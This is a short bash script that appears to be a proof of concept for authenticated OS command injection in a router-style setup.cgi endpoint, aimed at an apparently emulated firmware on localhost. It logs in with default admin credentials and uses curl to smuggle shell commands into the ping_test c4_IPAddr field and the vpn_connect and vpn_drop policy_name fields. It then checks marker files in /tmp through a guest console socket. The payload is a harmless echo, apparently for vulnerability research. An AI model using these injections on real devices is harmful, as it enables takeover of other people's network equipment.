#!/bin/bash
TARGET=${TARGET:-http://127.0.0.1:16358}
AUTH=${AUTH:-admin:password}
SOCK=<rehost-dir>
MARK="FIND0004_$(date +%s)"

guest(){ (printf "%s\n" "$1"; sleep 2) | socat -t 8 - UNIX-CONNECT:$SOCK 2>/dev/null | tr -d '\r'; }

echo "=== 1) ping_test c4_IPAddr (popen) ==="
guest "rm -f /tmp/f4a" >/dev/null
curl -s -u "$AUTH" --max-time 40 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=ping_test" --data-urlencode "this_file=diag.htm" \
 --data-urlencode "next_file=diagping.htm" \
 --data-urlencode "c4_IPAddr=127.0.0.1|/bin/echo $MARK-ping >/tmp/f4a"
sleep 5; guest "cat /tmp/f4a" | tail -3

echo "=== 2) vpn_connect policy_name (cmd_agent_ap) ==="
guest "rm -f /tmp/f4b" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=vpn_connect" --data-urlencode "next_file=index.htm" \
 --data-urlencode "policy_name=x;/bin/echo $MARK-vpnconnect >/tmp/f4b;"
sleep 3; guest "cat /tmp/f4b" | tail -3

echo "=== 3) vpn_drop policy_name (cmd_agent_ap) ==="
guest "rm -f /tmp/f4c" >/dev/null
curl -s -u "$AUTH" --max-time 25 -o /dev/null -w "HTTP:%{http_code}\n" "$TARGET/setup.cgi" \
 --data-urlencode "todo=vpn_drop" --data-urlencode "next_file=index.htm" \
 --data-urlencode "policy_name=x;/bin/echo $MARK-vpndrop >/tmp/f4c;"
sleep 3; guest "cat /tmp/f4c" | tail -3
